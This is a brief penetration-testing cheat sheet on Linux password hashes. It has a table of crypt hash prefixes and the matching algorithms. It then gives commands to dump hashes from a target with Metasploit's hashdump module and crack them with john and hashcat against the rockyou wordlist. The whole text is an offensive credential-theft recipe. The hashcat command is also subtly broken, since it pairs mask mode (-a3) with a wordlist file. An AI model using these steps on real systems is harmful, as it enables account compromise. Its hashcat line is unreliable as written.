
| Value | Hashing Algorithm |
| ----- | ----------------- |
| $1    | MD5               |
| $2    | Blowfish          |
| $5    | SHA-256           |
| $6    | SHA-512           |

Dump the hashes from target system
```rc
use post/linux/gather/hashdump
```

Crack password using `john`
```sh
john --format=sha512crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Crack password using `hashcat`
```sh
hashcat -a3 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```
